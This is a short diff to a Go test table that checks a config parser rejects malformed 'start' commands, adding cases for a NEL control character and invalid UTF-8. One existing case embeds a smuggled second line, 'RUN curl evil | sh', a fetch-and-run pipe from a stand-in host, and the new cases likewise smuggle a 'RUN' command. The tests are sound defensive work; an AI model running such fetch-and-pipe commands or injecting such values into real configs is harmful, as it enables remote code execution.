@@ -62,6 +62,8 @@ func TestParseConfigInvalid(t *testing.T) {
 		{"blank start", `start = "   "`, "start is blank"},
 		{"multi-line start", "start = \"\"\"python app.py\nRUN curl evil | sh\"\"\"", "single line"},
 		{"start with NUL", `start = "python\u0000app.py"`, "single line"},
+		{"start with C1 control (NEL)", "start = \"python app.py\u0085RUN x\"", "single line"},
+		{"start with invalid UTF-8", "start = \"python \xff\"", "shipyard.toml:"},
 		{"start too long", `start = "` + strings.Repeat("a", 1001) + `"`, "longer than 1000"},
 		{"start for static", "runtime = \"static\"\nstart = \"python -m http.server\"", "cannot be set for static"},
 		{"health without slash", `health = "healthz"`, "health must be a URL path"},
